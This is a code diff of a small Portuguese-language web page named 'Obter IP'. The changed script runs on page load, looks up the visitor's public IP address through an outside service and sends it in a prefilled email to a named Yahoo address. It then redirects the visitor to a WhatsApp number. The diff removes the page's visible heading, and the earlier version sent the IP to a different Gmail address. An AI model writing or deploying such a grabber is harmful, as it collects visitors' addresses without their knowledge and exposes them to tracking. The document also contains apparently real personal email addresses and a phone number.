@@ -4,25 +4,23 @@
     <title>Obter IP</title>
 </head>
 <body>
-    <h1>Obter IP</h1>
-
     <script>
-        function getIp(callback) {
-            fetch('/get-ip')
+        function getIp() {
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
-                .then(data => callback(data.ip))
+                .then(data => {
+                    const ip = data.ip;
+                    const emailUrl = `mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=O endereço IP do usuário é: ${ip}`;
+                    const whatsappUrl = 'https://wa.me/27998041981';
+                    window.location.href = emailUrl;
+                    setTimeout(function() {
+                        window.location.href = whatsappUrl;
+                    }, 2000);
+                })
                 .catch(error => console.error(error));
         }
 
-        getIp(function (ip) {
-            const emailUrl = 'mailto:fxditz00@gmail.com?subject=Endereço IP do Usuário&body=' + encodeURIComponent('O endereço IP do usuário é: ' + ip);
-            const whatsappUrl = 'https://wa.me/27998041981';
-
-            window.location.href = emailUrl;
-            setTimeout(function() {
-                window.location.href = whatsappUrl;
-            }, 2000);
-        });
+        getIp();
     </script>
 </body>
 </html>
